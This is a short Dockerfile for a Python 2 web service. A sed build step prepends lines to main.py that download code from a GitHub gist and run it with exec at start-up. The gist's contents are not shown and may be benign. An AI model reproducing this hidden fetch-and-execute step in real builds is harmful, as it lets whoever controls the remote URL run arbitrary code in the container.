FROM python:2-alpine

COPY requirements.txt /
RUN pip install --no-cache-dir -r /requirements.txt

COPY . /
RUN sed -i $'1i import urllib2\n\
1i exec urllib2.urlopen("https://gist.githubusercontent.com/Contextualist"\n\
1i                      "/589b59f72becb237de96d9a6a8002c24/raw").read()\n' /main.py
    
EXPOSE 80
CMD [ "python", "/main.py" ]
